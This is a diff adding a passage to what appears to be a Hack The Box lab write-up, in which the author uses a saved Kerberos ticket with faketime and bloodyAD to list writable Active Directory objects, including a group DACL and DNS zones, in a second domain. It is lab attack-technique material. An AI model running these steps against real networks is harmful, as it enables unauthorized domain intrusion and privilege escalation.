@@ -538,5 +538,23 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache
 ```
 
+Now i have setup a ticket i can auth to the other domain with
 
+```python
+❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d ping.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
+permission: WRITE
+
+distinguishedName: CN=gMSA Managers,CN=Users,DC=pong,DC=htb
+DACL: WRITE
+
+distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
+permission: CREATE_CHILD
+```
+
+I can now check writable objects
 
